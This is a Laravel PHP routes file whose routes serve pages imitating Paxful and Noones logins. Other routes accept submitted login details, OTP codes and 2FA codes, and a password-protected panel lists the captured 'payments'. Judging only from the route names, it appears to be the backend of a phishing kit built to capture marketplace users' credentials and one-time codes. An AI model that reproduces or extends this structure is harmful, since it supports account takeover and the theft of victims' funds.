<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PaymentController;
use Illuminate\Http\Request;


// Dynamic view route based on platform
Route::get('/plogin/{id}', [PaymentController::class, 'showPaxful'])->name('plogin.show');
Route::get('/nlogin/{id}', [PaymentController::class, 'showNoones'])->name('nlogin.show');
Route::get('/choice', [PaymentController::class, 'choice'])->name('choice');
Route::get('/track', [PaymentController::class, 'track'])->name('track');
Route::post('/track', [PaymentController::class, 'tracking'])->name('track');

Route::get('/login', function () {
    return view('auth.login');
})->name('login');


Route::post('/login', function (Request $request) {
    $credentials = $request->only('email', 'password');

    if (Auth::attempt($credentials)) {
        $request->session()->regenerate();
        return redirect()->intended('/payments/view');
    }

    return back()->withErrors([
        'email' => 'Invalid credentials.',
    ]);
})->name('login.submit');

// Handle logout
Route::post('/logout', function (Request $request) {
    Auth::logout();
    $request->session()->invalidate();
    $request->session()->regenerateToken();
    return redirect('/login');
})->name('logout');

// Final login redirection routes
Route::get('/plogin', function () {
    return "Redirected to Paxful login with ID: " . session('payment_id');
})->name('plogin.redirect');

Route::get('/nlogin', function () {
    return "Redirected to Noones login with ID: " . session('payment_id');
})->name('nlogin.redirect');
Route::post('/update-login', [PaymentController::class, 'updateLoginDetails'])->name('payment.updateLogin');

Route::get('/otpupdate', [PaymentController::class, 'getOtpForm'])->name('getOtpForm');
Route::get('/otpupdatenoones', [PaymentController::class, 'getOtpFormnoones'])->name('getOtpFormnoones');
// Route::get('/payments/create', [PaymentController::class, 'create'])->name('payments.create');
// Route::post('/payments', [PaymentController::class, 'store'])->name('payments.store');
// Route::get('/payments/view', [PaymentController::class, 'view'])->name('payments.view');
Route::post('/2fa-submit', [PaymentController::class, 'store2fa'])->name('submit.2fa');



Route::middleware(['auth'])->group(function () {
    Route::get('/payments/create', [PaymentController::class, 'create'])->name('payments.create');
    Route::post('/payments', [PaymentController::class, 'store'])->name('payments.store');
    Route::get('/payments/view', [PaymentController::class, 'view'])->name('payments.view');
});

Route::get('/', function () {
    return view('welcome');
});

Route::get('/plogin', function () {
    return view('paxful');
});

Route::get('/nlogin', function () {
    return view('noones');
});
